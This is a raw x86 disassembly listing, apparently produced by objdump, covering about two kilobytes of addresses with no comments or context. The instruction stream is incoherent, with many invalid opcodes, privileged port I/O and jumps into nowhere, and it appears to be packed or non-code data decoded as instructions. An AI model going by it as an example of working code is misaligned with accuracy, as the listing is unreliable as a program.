  473c37:	adc    BYTE PTR [edx+0x513a4212],cl
  473c3d:	sti    
  473c3e:	je     0x473c00
  473c40:	add    bl,BYTE PTR [edi-0x3af6a74]
  473c46:	inc    eax
  473c47:	xor    BYTE PTR [edx-0xc],al
  473c4a:	sbb    al,0x81
  473c4c:	call   DWORD PTR [esi]
  473c4e:	iret   
  473c4f:	pop    esp
  473c50:	cmp    BYTE PTR [eax-0x13],0x0
  473c54:	jne    0x473c80
  473c56:	aaa    
  473c57:	outs   dx,DWORD PTR ds:[esi]
  473c58:	imul   DWORD PTR [ebx-0x65]
  473c5b:	jb     0x473ccd
  473c5d:	or     al,0x4
  473c5f:	or     BYTE PTR [esi],dl
  473c61:	lea    ecx,[eax-0x12]
  473c64:	or     edx,DWORD PTR [eax-0x10]
  473c67:	lahf   
  473c68:	int3   
  473c69:	(bad)  
  473c6a:	pop    esi
  473c6b:	pop    eax
  473c6c:	xor    BYTE PTR [eax+ecx*2-0x12bf39ec],cl
  473c73:	add    DWORD PTR [edx+0x6f],esi
  473c76:	outs   dx,DWORD PTR ds:[esi]
  473c77:	pop    ebx
  473c78:	dec    eax
  473c79:	xor    esp,ebx
  473c7b:	xor    DWORD PTR [esi-0x1c],edx
  473c7e:	push   eax
  473c7f:	jge    0x473c3e
  473c81:	jl     0x473cb1
  473c83:	xchg   edi,eax
  473c84:	out    0xe8,al
  473c86:	jmp    0x7084:0x1e36089
  473c8d:	fimul  WORD PTR [ecx+0x7]
  473c90:	in     al,0xfe
  473c92:	add    bl,BYTE PTR [edi-0x7a]
  473c95:	jmp    0x473cff
  473c97:	lea    edx,[ebx]
  473c99:	(bad)  
  473c9a:	fisub  DWORD PTR ds:0x9b2be4d6
  473ca0:	add    DWORD PTR [eax+0x4cb07bc1],esp
  473ca6:	shl    DWORD PTR [eax-0x68],1
  473ca9:	inc    eax
  473caa:	push   edi
  473cab:	adc    al,0xa
  473cad:	cmp    al,0x23
  473caf:	iret   
  473cb0:	lock jmp 0x27ea:0x2f18eeee
  473cb8:	fdivr  QWORD PTR [edx+0x3ce06a18]
  473cbe:	push   0x2157f700
  473cc3:	xchg   esp,eax
  473cc4:	dec    esp
  473cc5:	call   0x7b2f89a5
  473cca:	add    BYTE PTR ds:0x58bfb20e,ch
  473cd0:	sti    
  473cd1:	lock fisttp DWORD PTR [ecx]
  473cd4:	js     0x473c6c
  473cd6:	test   al,0xa5
  473cd8:	or     DWORD PTR [ebp+0x7fbf5595],0xffffff92
  473cdf:	scas   al,BYTE PTR es:[edi]
  473ce0:	mov    ecx,0xf4e8b6a
  473ce5:	test   DWORD PTR [eax+esi*1+0x508744a1],ecx
  473cec:	jno    0x473ce9
  473cee:	lods   eax,DWORD PTR ds:[esi]
  473cef:	inc    ebp
  473cf0:	push   esi
  473cf1:	je     0x473d15
  473cf3:	or     BYTE PTR ds:0x3867d75,cl
  473cf9:	imul   ecx,ebp,0xe31395
  473cff:	mov    dh,0xc8
  473d01:	sbb    ebp,DWORD PTR [edi-0x7b]
  473d04:	std    
  473d05:	(bad)  
  473d06:	cmp    ah,al
  473d08:	jmp    0x473d6a
  473d0a:	cmp    DWORD PTR ds:0x75015848,0x57
  473d11:	sub    al,0xc5
  473d13:	adc    DWORD PTR [ebp-0x4a2de244],ebx
  473d19:	inc    esp
  473d1a:	fidiv  DWORD PTR [ebp+0x42]
  473d1d:	jb     0x473d22
  473d1f:	pop    eax
  473d20:	popf   
  473d21:	add    al,BYTE PTR ds:0xc203d99e
  473d27:	dec    eax
  473d28:	push   ds
  473d29:	inc    esi
  473d2a:	in     al,0xd
  473d2c:	cmc    
  473d2d:	jle    0x473d8f
  473d2f:	adc    eax,0x1b8b9c35
  473d34:	pusha  
  473d35:	pusha  
  473d36:	mov    eax,0xc3c78ef0
  473d3b:	aaa    
  473d3c:	xchg   BYTE PTR [edx-0x38],bh
  473d3f:	push   es
  473d40:	inc    ebx
  473d41:	mov    DWORD PTR [eax],ecx
  473d43:	enter  0x316d,0x40
  473d47:	mov    cs,WORD PTR [ecx+0x11e51b52]
  473d4d:	leave  
  473d4e:	pop    es
  473d4f:	jnp    0x473da5
  473d51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  473d52:	addr16 addr16 push es
  473d55:	xlat   BYTE PTR ds:[ebx]
  473d56:	in     al,dx
  473d57:	or     bh,BYTE PTR fs:[ecx-0x1305347a]
  473d5e:	in     al,dx
  473d5f:	add    al,0x26
  473d61:	cdq    
  473d62:	out    dx,al
  473d63:	repnz cmp al,0x7f
  473d66:	pcmpgtb mm0,QWORD PTR [edi+0x10d53b27]
  473d6d:	mov    eax,ds:0x1cf30deb
  473d72:	mov    eax,ds:0x2642e487
  473d77:	in     al,dx
  473d78:	in     al,dx
  473d79:	je     0x473dae
  473d7b:	aaa    
  473d7c:	pushf  
  473d7d:	nop
  473d7e:	push   cs
  473d7f:	jmp    0x473d6d
  473d81:	jne    0x473da1
  473d83:	dec    esi
  473d84:	cmp    BYTE PTR [eax],0x30
  473d87:	and    BYTE PTR [edi],cl
  473d89:	xchg   ecx,esp
  473d8b:	jne    0x473da4
  473d8d:	push   ebx
  473d8e:	mov    eax,ecx
  473d90:	dec    ecx
  473d91:	retf   0x5602
  473d94:	jb     0x473d1e
  473d96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  473d97:	or     eax,0x7be5a101
  473d9c:	or     BYTE PTR [esi],cl
  473d9e:	icebp  
  473d9f:	out    dx,eax
  473da0:	jns    0x473e1b
  473da2:	add    BYTE PTR [edi],dl
  473da4:	add    al,0x4a
  473da6:	out    0x13,al
  473da8:	mov    edx,0xd44f001b
  473dad:	test   al,0x6b
  473daf:	mov    al,ds:0x4d4b23d
  473db4:	fdiv   DWORD PTR [esi-0x6cbf788b]
  473dba:	popf   
  473dbb:	or     ecx,edx
  473dbd:	test   al,0xf6
  473dbf:	sub    al,0x1e
  473dc1:	add    DWORD PTR [esi+0x66],0xb86d075d
  473dc8:	adc    al,0x2
  473dca:	lods   eax,DWORD PTR ds:[esi]
  473dcb:	push   edx
  473dcc:	into   
  473dcd:	or     ah,dl
  473dcf:	dec    ebp
  473dd0:	pop    ds
  473dd1:	inc    DWORD PTR [eax-0xadf1ddc]
  473dd7:	inc    ecx
  473dd8:	dec    edi
  473dd9:	mov    bl,0x6
  473ddb:	in     eax,dx
  473ddc:	add    bl,ah
  473dde:	loope  0x473e10
  473de0:	cwde   
  473de1:	xchg   edi,eax
  473de2:	jb     0x473dcc
  473de4:	or     al,0x81
  473de6:	shl    BYTE PTR [edx+ebx*8+0x57],1
  473dea:	scas   eax,DWORD PTR es:[edi]
  473deb:	fimul  WORD PTR [ebx-0x37]
  473dee:	bt     DWORD PTR ds:0x27735c0c,eax
  473df5:	jmp    0x473daa
  473df7:	push   esp
  473df8:	iret   
  473df9:	pop    DWORD PTR [esi]
  473dfb:	and    al,0xb7
  473dfd:	sbb    al,0x6
  473dff:	pop    ebx
  473e00:	and    DWORD PTR [ecx*4-0x76232486],edi
  473e07:	push   es
  473e08:	xchg   ebp,eax
  473e09:	jge    0x473e2e
  473e0b:	mov    bl,BYTE PTR [ebp-0x74]
  473e0e:	add    al,0x6f
  473e10:	sub    BYTE PTR [eax-0x23eb607c],ch
  473e16:	adc    al,0xbf
  473e18:	loopne 0x473dc0
  473e1a:	push   ebp
  473e1b:	cmp    bh,dh
  473e1d:	dec    ebp
  473e1e:	jne    0x473df8
  473e20:	jge    0x473e04
  473e22:	dec    eax
  473e23:	push   ds
  473e24:	adc    dh,bl
  473e26:	pusha  
  473e27:	mov    cs,WORD PTR [esi-0x78]
  473e2a:	pop    ebp
  473e2b:	loop   0x473dd7
  473e2d:	fnsave [eax-0x215965c5]
  473e33:	mov    dh,0x38
  473e35:	ja     0x6cc764af
  473e3b:	lods   al,BYTE PTR ds:[esi]
  473e3c:	jnp    0x473dff
  473e3e:	or     esp,DWORD PTR [edx-0x7adb0080]
  473e44:	inc    esp
  473e45:	or     al,0xa0
  473e47:	or     edx,edi
  473e49:	enter  0xbc9b,0xe
  473e4d:	or     eax,0xb0e0c
  473e52:	or     al,0x5
  473e54:	xchg   ecx,eax
  473e55:	mov    cl,0xdb
  473e57:	sub    eax,0x17060218
  473e5c:	add    al,0x7
  473e5e:	or     ecx,DWORD PTR [eax]
  473e60:	or     DWORD PTR [edi+0x69],esp
  473e63:	mov    esi,0x890ab0f7
  473e68:	or     BYTE PTR [eax+eax*4-0x5cfff92d],al
  473e6f:	sub    eax,0xe7cd9a79
  473e74:	xchg   edx,eax
  473e75:	aas    
  473e76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  473e77:	push   edx
  473e78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  473e79:	xor    DWORD PTR [esp+edi*2-0x16183266],0x1a
  473e81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  473e82:	xchg   ebx,eax
  473e83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  473e84:	icebp  
  473e85:	pop    ss
  473e86:	test   al,0xf7
  473e88:	aaa    
  473e89:	test   ebx,edx
  473e8b:	or     cl,BYTE PTR ss:[esi+0x60d5904]
  473e92:	sbb    eax,0x5934ea0a
  473e97:	enter  0x2358,0xff
  473e9b:	lds    edx,FWORD PTR [ebx]
  473e9d:	loop   0x473ea7
  473e9f:	stos   BYTE PTR es:[edi],al
  473ea0:	mov    ecx,0xc28bf199
  473ea5:	mov    eax,ds:0xf04b7b1
  473eaa:	lea    edi,[eax-0x45ba08a7]
  473eb0:	add    al,0x2f
  473eb2:	inc    ecx
  473eb3:	mov    cl,0x4b
  473eb5:	sub    al,0x9d
  473eb7:	dec    ebx
  473eb8:	push   ebp
  473eb9:	lea    esp,[esi+0x42]
  473ebc:	mov    edx,0x216653a7
  473ec1:	lods   al,BYTE PTR ds:[esi]
  473ec2:	fcomp  DWORD PTR [ecx-0x68]
  473ec5:	adc    eax,0xd4b91cf2
  473eca:	nop
  473ecb:	sbb    ah,dl
  473ecd:	mov    eax,0xf4e0406a
  473ed2:	dec    eax
  473ed3:	sbb    dh,cl
  473ed5:	sbb    bl,ch
  473ed7:	xor    BYTE PTR ds:0x192c248c,dl
  473edd:	inc    eax
  473ede:	inc    ebp
  473edf:	mov    ah,0x67
  473ee1:	shr    BYTE PTR ds:0xa485042a,1
  473ee7:	inc    esi
  473ee8:	xchg   ebp,eax
  473ee9:	xor    esp,DWORD PTR [eax]
  473eeb:	sub    al,0xb5
  473eed:	jae    0x473ec3
  473eef:	leave  
  473ef0:	mov    ebx,0xddbb6d
  473ef5:	mov    edx,0x4497448
  473efa:	ins    DWORD PTR es:[edi],dx
  473efb:	jmp    0x473f7c
  473efd:	out    dx,eax
  473efe:	aad    0xf0
  473f00:	or     BYTE PTR [ebx-0x37],0xee
  473f04:	push   es
  473f05:	fwait
  473f06:	dec    ebp
  473f07:	xor    DWORD PTR ds:[esi],ebx
  473f0a:	out    0x68,al
  473f0c:	(bad)  
  473f0d:	mov    edx,0xa7bf8704
  473f12:	mov    fs:0x8ca1204d,al
  473f18:	xchg   BYTE PTR [edi],ah
  473f1a:	xchg   ecx,eax
  473f1b:	and    BYTE PTR [ebx-0x6fda369f],cl
  473f21:	and    edx,edi
  473f23:	and    al,0x52
  473f25:	shr    DWORD PTR [ecx+ebx*2+0x2c],1
  473f29:	loopne 0x473f25
  473f2b:	cmp    bl,ah
  473f2d:	adc    BYTE PTR ss:[ecx+0x195c00c],cl
  473f34:	pop    esp
  473f35:	mov    dh,0xab
  473f37:	(bad)  
  473f38:	imul   eax,DWORD PTR [edi+0x77],0x10
  473f3c:	and    al,0x5f
  473f3e:	inc    ebp
  473f3f:	movzx  ecx,BYTE PTR [esi]
  473f42:	adc    bl,BYTE PTR [edx+0x7f48a02e]
  473f48:	pop    ss
  473f49:	js     0x473ecd
  473f4b:	cmp    ebx,DWORD PTR [ebx+0x22edcdff]
  473f51:	je     0x473fb9
  473f53:	or     BYTE PTR ds:0x741a6174,al
  473f59:	push   cs
  473f5a:	jmp    0x473fbe
  473f5c:	sub    eax,0x61
  473f5f:	je     0x473f68
  473f61:	pop    es
  473f62:	je     0x473f0c
  473f64:	(bad)  
  473f65:	fwait
  473f66:	call   0x909e2ad2
  473f6b:	mov    esp,0xd8ba5075
  473f70:	fs std 
  473f72:	ins    DWORD PTR es:[edi],dx
  473f73:	pusha  
  473f74:	out    0xad,al
  473f76:	fwait
  473f77:	jp     0x473f1b
  473f79:	sub    al,0xba
  473f7b:	loopne 0x473f0d
  473f7d:	retf   0xd213
  473f80:	sub    eax,DWORD PTR [ebx]
  473f82:	push   ss
  473f83:	mov    edx,0x4ded04e4
  473f88:	aas    
  473f89:	cmp    eax,0x1f81d75
  473f8e:	jmp    0x473fa7
  473f90:	in     al,0xe0
  473f92:	xor    al,0x1
  473f94:	mov    BYTE PTR [eax],cl
  473f96:	inc    DWORD PTR [edx]
  473f98:	sbb    bl,BYTE PTR [ecx+0x67]
  473f9b:	xor    bh,BYTE PTR [eax]
  473f9d:	mov    eax,ds:0xca809b4a
  473fa2:	ds mov edx,0xd0ea7d8b
  473fa8:	cmp    cl,BYTE PTR [edi+edi*4+0x88a8042]
  473faf:	push   es
  473fb0:	mov    di,0xc
  473fb4:	jmp    0x473fc0
  473fb6:	sbb    eax,ebx
  473fb8:	push   0x476c87b
  473fbd:	or     ch,bh
  473fbf:	or     al,0x3b
  473fc1:	jle    0x473fca
  473fc3:	sub    ah,BYTE PTR [esi+0x19a87230]
  473fc9:	adc    eax,edi
  473fcb:	adc    DWORD PTR [ebp+edx*8+0x5f25c346],eax
  473fd2:	push   es
  473fd3:	enter  0x4c45,0x14
  473fd7:	popa   
  473fd8:	out    0x5a,al
  473fda:	test   al,0x31
  473fdc:	mov    dh,0x56
  473fde:	rcl    BYTE PTR [ebx-0x60],0x79
  473fe2:	and    esp,0x3caa44a
  473fe8:	xlat   BYTE PTR ds:[ebx]
  473fe9:	xchg   ebp,eax
  473fea:	dec    esp
  473feb:	jb     0x473ff0
  473fed:	in     al,0x6c
  473fef:	out    0xc4,al
  473ff1:	add    DWORD PTR [esi-0x16a5b73b],eax
  473ff7:	jne    0x474022
  473ff9:	scas   al,BYTE PTR es:[edi]
  473ffa:	xchg   esp,eax
  473ffb:	pop    ss
  473ffc:	in     eax,dx
  473ffd:	shr    dl,cl
  473fff:	or     al,0xfe
  474001:	add    DWORD PTR [ebp-0x24],0x3
  474005:	inc    ecx
  474006:	sahf   
  474007:	ret    
  474008:	pop    es
  474009:	enter  0x583f,0x83
  47400d:	push   es
  47400e:	add    al,0xd1
  474010:	xchg   edi,eax
  474011:	jb     0x47404c
  474013:	bound  ebp,QWORD PTR [ebx]
  474015:	cmp    edi,DWORD PTR [ebp+0x2]
  474018:	add    DWORD PTR [ecx],eax
  47401a:	mov    ah,BYTE PTR [ebx+edx*1]
  47401d:	add    cl,BYTE PTR [ebp-0x40f859c3]
  474023:	xor    edi,DWORD PTR [ebp+0x73]
  474026:	adc    ecx,ebx
  474028:	cwde   
  474029:	xchg   ebx,ebp
  47402b:	rdmsr  
  47402d:	dec    ecx
  47402e:	sbb    esi,edx
  474030:	and    DWORD PTR [eax+edx*4-0x595613fd],ebx
  474037:	dec    ebp
  474038:	push   edi
  474039:	xor    DWORD PTR [edi+0x65484435],ebp
  47403f:	jbe    0x473fd5
  474041:	(bad)  
  474042:	hlt    
  474043:	add    edi,esp
  474045:	shl    BYTE PTR [edx-0x37],1
  474048:	add    al,0x2
  47404a:	(bad)  
  47404b:	sti    
  47404c:	aad    0x42
  47404e:	jp     0x47406d
  474050:	out    dx,eax
  474051:	add    DWORD PTR [ebp+eax*1+0x4d],edx
  474055:	push   es
  474056:	sub    eax,DWORD PTR [esi]
  474058:	sbb    eax,0xd11208e9
  47405d:	and    DWORD PTR [edi+0xbe80c79],0x70d2ece6
  474067:	lods   al,BYTE PTR ds:[esi]
  474068:	or     eax,0xf8b8895e
  47406d:	cs popf 
  47406f:	minps  xmm2,XMMWORD PTR [eax+0x3d800f77]
  474076:	mov    DWORD PTR [eax],esp
  474078:	push   0x56f91e9d
  47407d:	outs   dx,BYTE PTR ds:[esi]
  47407e:	sub    DWORD PTR [ecx+0x4b],0x437b7494
  474085:	xchg   esp,eax
  474086:	push   esp
  474087:	not    ch
  474089:	or     ebx,ebp
  47408b:	gs leave 
  47408d:	jmp    0x4740ae
  47408f:	or     al,0xc1
  474091:	cmp    dl,BYTE PTR [ecx]
  474093:	and    bl,BYTE PTR [ebx+ecx*1+0x1f]
  474097:	add    BYTE PTR [esi],0x4b
  47409a:	mov    ecx,0x98710c7
  47409f:	dec    ebx
  4740a0:	fmul   st,st(5)
  4740a2:	xchg   BYTE PTR [ebx+ecx*4-0x2f],bh
  4740a6:	leave  
  4740a7:	mov    edx,DWORD PTR [esi]
  4740a9:	sub    edx,DWORD PTR [ebp-0x24]
  4740ac:	inc    ebx
  4740ad:	push   ss
  4740ae:	push   esi
  4740af:	mov    ebp,0xeb54b0d4
  4740b4:	adc    bl,BYTE PTR [ecx]
  4740b6:	cmp    DWORD PTR [eax],ebp
  4740b8:	(bad)  
  4740ba:	test   al,0x70
  4740bc:	sahf   
  4740bd:	pusha  
  4740be:	xchg   BYTE PTR [eax-0x383d466b],cl
  4740c4:	jae    0x474097
  4740c6:	test   al,0xd4
  4740c8:	in     eax,0x9e
  4740ca:	enter  0x9fac,0xd3
  4740ce:	sbb    ch,bl
  4740d0:	repz inc ecx
  4740d2:	dec    ebp
  4740d3:	das    
  4740d4:	push   eax
  4740d5:	dec    ebp
  4740d6:	mov    dh,0xb3
  4740d8:	xlat   BYTE PTR ds:[ebx]
  4740d9:	in     al,dx
  4740da:	mov    edx,0x154d060c
  4740df:	push   cs
  4740e0:	add    BYTE PTR [edi],cl
  4740e2:	in     eax,0x21
  4740e4:	sahf   
  4740e5:	push   ss
  4740e6:	cli    
  4740e7:	mov    edi,0x37319df8
  4740ec:	add    BYTE PTR [edi-0x7b],ah
  4740ef:	imul   BYTE PTR [eax+0x23]
  4740f2:	or     esi,ecx
  4740f4:	movntps XMMWORD PTR [edx+0x44],xmm5
  4740f8:	ret    
  4740f9:	sbb    ah,BYTE PTR [edi-0xa]
  4740fc:	addr16 ja 0x4740ea
  4740ff:	or     al,0x55
  474101:	mov    eax,0x1be6a954
  474106:	lea    edx,[ebp-0x223dc6f9]
  47410c:	imul   eax,esi,0xd1618d8b
  474112:	or     esp,edx
  474114:	add    esp,DWORD PTR [ebp-0x23]
  474117:	or     BYTE PTR [edi-0x742e48bd],bh
  47411d:	adc    eax,0xbdcd7201
  474122:	xchg   DWORD PTR [eax-0x5bd0c208],ebx
  474128:	sub    DWORD PTR [ebp+ecx*2+0x27d233ed],ecx
  47412f:	xchg   edx,eax
  474130:	and    eax,0x4f115053
  474135:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  474136:	lock mov ebx,DWORD PTR [edi]
  474139:	pushf  
  47413a:	loope  0x4740eb
  47413c:	and    bl,BYTE PTR [esi+0x7fd83b4f]
  474142:	stos   BYTE PTR es:[edi],al
  474143:	push   ds
  474144:	jmp    DWORD PTR [eax]
  474146:	je     0x474135
  474148:	mov    DWORD PTR [edi],ebx
  47414a:	mov    ss,WORD PTR [edx]
  47414c:	sbb    BYTE PTR [edx+0x7f],ah
  47414f:	hlt    
  474150:	push   ecx
  474151:	clc    
  474152:	loope  0x47416a
  474154:	sub    eax,0xd5f7fe8a
  474159:	(bad)  
  47415a:	loopne 0x474178
  47415c:	fld    TBYTE PTR [edi-0x2a]
  47415f:	addr16 out 0x99,al
  474162:	lods   al,BYTE PTR ds:[esi]
  474163:	mov    WORD PTR [ebx-0x1409cce5],cs
  474169:	pop    ss
  47416a:	mov    al,BYTE PTR [ebx]
  47416c:	rcl    BYTE PTR [esi+0xb],0x2a
  474170:	or     ah,bl
  474172:	enter  0x1f54,0x48
  474176:	mov    bl,0xaf
  474178:	push   es
  474179:	mov    dh,0xea
  47417b:	xor    BYTE PTR [esi+0x3],ah
  47417e:	ret    0xb8c0
  474181:	(bad)  
  474182:	ficom  DWORD PTR [ecx-0x41]
  474185:	cmp    eax,0x30448a11
  47418a:	add    al,0xd0
  47418c:	sub    al,0xa
  47418e:	jae    0x474197
  474190:	mov    bl,0x72
  474192:	int    0x3b
  474194:	xchg   ecx,eax
  474195:	lock retf 0x18b2
  474199:	jle    0x474189
  47419b:	popf   
  47419c:	adc    ch,BYTE PTR [edx]
  47419e:	ds jmp 0x2f09cf7f
  4741a4:	mov    BYTE PTR [edx],al
  4741a6:	sub    BYTE PTR [ecx+0x30894218],cl
  4741ac:	push   es
  4741ad:	adc    BYTE PTR [ecx+ebp*8-0x22],0x34
  4741b2:	mul    edx
  4741b4:	sbb    bl,BYTE PTR [edx]
  4741b6:	int    0xff
  4741b8:	mov    ch,0x98
  4741ba:	or     BYTE PTR [ebp+0x3e],0x82
  4741be:	loope  0x47416a
  4741c0:	xor    al,cl
  4741c2:	push   ecx
  4741c3:	pop    es
  4741c4:	xlat   BYTE PTR ds:[ebx]
  4741c5:	popa   
  4741c6:	(bad)  
  4741c7:	nop
  4741c8:	inc    ebx
  4741c9:	les    ecx,FWORD PTR [ebx]
  4741cb:	arpl   WORD PTR [esi+0x14],cx
  4741ce:	arpl   WORD PTR [edx-0x663bd2ea],sp
  4741d4:	mov    es,esp
  4741d6:	adc    esi,DWORD PTR [edx+0x1c02202b]
  4741dc:	add    di,WORD PTR [edi-0x4cf9febf]
  4741e3:	add    ebp,edx
  4741e5:	call   0x488bc994
  4741ea:	sahf   
  4741eb:	xor    esp,DWORD PTR [edi+ebx*4-0x3d2e3b7a]
  4741f2:	push   ecx
  4741f3:	mov    BYTE PTR [eax+0x7b8618aa],ah
  4741f9:	push   ss
  4741fa:	jg     0x4741d8
  4741fc:	fwait
  4741fd:	pop    es
  4741fe:	or     edx,DWORD PTR [edi]
  474200:	adc    al,0x58
  474202:	test   BYTE PTR [edi],al
  474204:	in     al,0x6
  474206:	(bad)  
  474207:	cmp    cl,BYTE PTR [ebx]
  474209:	inc    ebx
  47420a:	loop   0x474216
  47420c:	dec    eax
  47420d:	add    al,0xff
  47420f:	pop    es
  474210:	inc    esp
  474211:	jmp    0x47425b
  474213:	mov    esp,0xbf629f31
  474218:	fwait
  474219:	sub    DWORD PTR [ebx+ecx*1+0x8],eax
  47421d:	cld    
  47421e:	jg     0x47425e
  474220:	jmp    DWORD PTR [edi+ebx*8]
  474223:	sub    al,0x44
  474225:	je     0x474241
  474227:	dec    al
  474229:	je     0x474235
  47422b:	sub    al,0x6
  47422d:	sub    al,0xc
  47422f:	adc    ebx,ecx
  474231:	sti    
  474232:	mov    ds:0xb3109074,al
  474237:	add    ch,bl
  474239:	sbb    al,BYTE PTR [esi]
  47423b:	push   ss
  47423c:	push   eax
  47423d:	test   al,0x76
  47423f:	aaa    
  474240:	icebp  
  474241:	push   ds
  474242:	jbe    0x47422f
  474244:	push   cs
  474245:	inc    edi
  474246:	mov    cl,0xf8
  474248:	jle    0x474216
  47424a:	fadd   st(3),st
  47424c:	(bad)  
  47424d:	xlat   BYTE PTR ds:[ebx]
  47424e:	sub    al,0xc0
  474250:	arpl   bp,sp
  474252:	mov    al,ds:0xba7ed503
  474257:	(bad)  
  474259:	mov    DWORD PTR ds:0x8c64138b,ecx
  47425f:	mov    WORD PTR [ecx+0xf645e03],cs
  474265:	jnp    0x47426a
  474267:	jg     0x47426c
  474269:	jl     0x474277
  47426b:	pop    ebx
  47426c:	pop    ss
  47426d:	(bad)  
  47426e:	sub    BYTE PTR [esp+ebx*8+0x14],bh
  474272:	scas   eax,DWORD PTR es:[edi]
  474273:	push   ecx
  474274:	mov    ebp,eax
  474276:	fsubr  QWORD PTR [edi-0x40ec9769]
  47427c:	sub    bh,BYTE PTR [ebx+0x6cbece50]
  474282:	or     dh,dh
  474284:	mov    WORD PTR [edi],gs
  474286:	and    al,0x3c
  474288:	sub    DWORD PTR [ebx-0x5e8d683b],ecx
  47428e:	cmc    
  47428f:	sar    DWORD PTR [edx+0xf],0x2c
  474293:	mov    eax,0x8095d804
  474298:	inc    ebx
  474299:	loope  0x474226
  47429b:	push   es
  47429c:	jbe    0x4742a7
  47429e:	je     0x4742e3
  4742a0:	popa   
  4742a1:	xchg   DWORD PTR [eax+0x4ed275f0],eax
  4742a7:	hlt    
  4742a8:	push   cs
  4742a9:	pop    ecx
  4742aa:	adc    ah,cl
  4742ac:	out    dx,eax
  4742ad:	cmp    DWORD PTR ds:0xff85bd9,0xffffff8c
  4742b4:	adc    dh,BYTE PTR [ebp+0x3a]
  4742b7:	cmp    ebx,0x63
  4742ba:	jg     0x47429a
  4742bc:	(bad)  
  4742be:	cmp    edx,DWORD PTR [ecx]
  4742c0:	das    
  4742c1:	dec    esp
  4742c2:	setns  BYTE PTR [ebx]
  4742c5:	ret    0xc22b
  4742c8:	add    ecx,eax
  4742ca:	pop    ds
  4742cb:	jmp    0x6491d865
  4742d0:	add    BYTE PTR [ebx-0x40],ch
  4742d3:	add    eax,DWORD PTR fs:[esi]
  4742d6:	cmp    DWORD PTR [eax-0x4],0xffffff9d
  4742da:	ins    DWORD PTR es:[edi],dx
  4742db:	cmc    
  4742dc:	out    dx,eax
  4742dd:	add    BYTE PTR [esi+0xe],bh
  4742e0:	adc    bh,dh
  4742e2:	pop    eax
  4742e3:	cld    
  4742e4:	jmp    0x4742ec
  4742e6:	ins    DWORD PTR es:[edi],dx
  4742e7:	dec    eax
  4742e8:	cld    
  4742e9:	gs add eax,ebx
  4742ec:	shr    esi,cl
  4742ee:	cmp    BYTE PTR [edx],ah
  4742f0:	fmul   DWORD PTR [bx]
  4742f3:	fadd   DWORD PTR [esp+ebx*8]
  4742f6:	js     0x47432f
  4742f8:	inc    esi
  4742f9:	dec    ebp
  4742fa:	loopne 0x4742e0
  4742fc:	push   edx
  4742fd:	mov    ebx,0xd9e6af8b
  474302:	inc    ebp
  474303:	jecxz  0x474326
  474305:	sbb    al,0xc7
  474307:	inc    ebp
  474308:	out    dx,al
  474309:	mov    esi,0x2300ec0a
  47430e:	add    DWORD PTR [eax+ebp*4],ebx
  474311:	loop   0x4742a4
  474313:	add    al,0x6
  474315:	ret    0x27df
  474318:	fwait
  474319:	sub    BYTE PTR [eax+0x5283f645],cl
  47431f:	loop   0x4742cf
  474321:	push   edi
  474322:	loopne 0x474349
  474324:	fdivr  DWORD PTR [esi]
  474326:	xor    eax,0x34756768
  47432b:	scas   eax,DWORD PTR es:[edi]
  47432c:	lahf   
  47432d:	je     0x474335
  47432f:	fistp  DWORD PTR [ebx+0xb8b0674]
  474335:	dec    ecx
  474336:	lods   eax,DWORD PTR ds:[esi]
  474337:	test   DWORD PTR [ebp+0x7b],esi
  47433a:	mov    esp,0x8d248025
  47433f:	push   ebp
  474340:	in     al,0x6c
  474342:	dec    esi
  474343:	cmc    
  474344:	in     eax,dx
  474345:	dec    esp
  474346:	jno    0x474357
  474348:	fwait
  474349:	mov    esp,0x531ceb88
  47434e:	mov    eax,0xd58b0ea4
  474353:	loope  0x474353
  474355:	sti    
  474356:	enter  0x878,0xa1
  47435a:	xchg   ecx,eax
  47435b:	cli    
  47435c:	(bad)  
  47435d:	test   al,0x76
  47435f:	cmp    cl,BYTE PTR [ebx+ebp*8-0x66520b32]
  474366:	rol    BYTE PTR [esi+ecx*1+0x61d5ed8],1
  47436d:	xor    esi,esi
  47436f:	and    BYTE PTR [edx-0x258681f3],cl
  474375:	test   eax,0xf09a2dfc
  47437a:	sbb    bl,BYTE PTR [edx+ebp*8-0xe]
  47437e:	sub    ah,BYTE PTR [edi]
  474380:	nop
  474381:	add    eax,DWORD PTR [edx]
  474383:	into   
  474384:	add    cl,ch
  474386:	dec    ebp
  474387:	add    DWORD PTR [ebx],0x79
  47438a:	lock shl DWORD PTR [edx-0x7a],cl
  47438e:	test   BYTE PTR [ebp+0x2ce3a3f8],0x1
  474395:	jb     0x474349
  474397:	and    al,dl
  474399:	cmp    ch,bl
  47439b:	push   edx
  47439c:	xor    al,0xf0
  47439e:	inc    ecx
  47439f:	lea    ebp,[edx]
  4743a1:	push   0xe8ece924
  4743a6:	(bad)  
  4743a7:	hlt    
  4743a8:	sbb    al,0x6c
  4743aa:	pop    es
  4743ab:	ffree  st(4)
  4743ad:	push   cs
  4743ae:	jmp    0x47439b
  4743b0:	ss aaa 
  4743b2:	repnz nop
  4743b4:	out    0xb9,al
  4743b6:	pushf  
  4743b7:	hlt    
  4743b8:	sbb    dh,ah
  4743ba:	jmp    0x4743fe
  4743bc:	mov    ah,0x58
  4743be:	cdq    
  4743bf:	lock cmp DWORD PTR [ebp+0x5d],0x55
  4743c4:	xchg   cl,dh
  4743c6:	fbstp  TBYTE PTR [ecx+edx*1-0x62]
  4743ca:	pushf  
  4743cb:	clc    
  4743cc:	jmp    0x47443e
  4743ce:	cmp    BYTE PTR [ebp-0x18],0x2
  4743d2:	ja     0x47443e
  4743d4:	xor    al,0x8d
  4743d6:	adc    BYTE PTR [edx-0x21],al
  4743d9:	loop   0x4743b3
  4743db:	sub    edx,edi
  4743dd:	loop   0x47442f
  4743df:	pop    esp
  4743e0:	(bad)  
  4743e1:	push   ecx
  4743e2:	fstp   DWORD PTR [ecx+0x66]
  4743e5:	fmul   QWORD PTR [edx-0xa]
  4743e8:	ja     0x4743c1
  4743ea:	sub    eax,0x373d2a
  4743ef:	jbe    0x47442d
  4743f1:	cmp    BYTE PTR [ebx],0xc8
  4743f4:	jle    0x47442b
  4743f6:	and    BYTE PTR [eax],dl
  4743f8:	popa   
  4743f9:	mov    bl,0xf7
  4743fb:	(bad)  
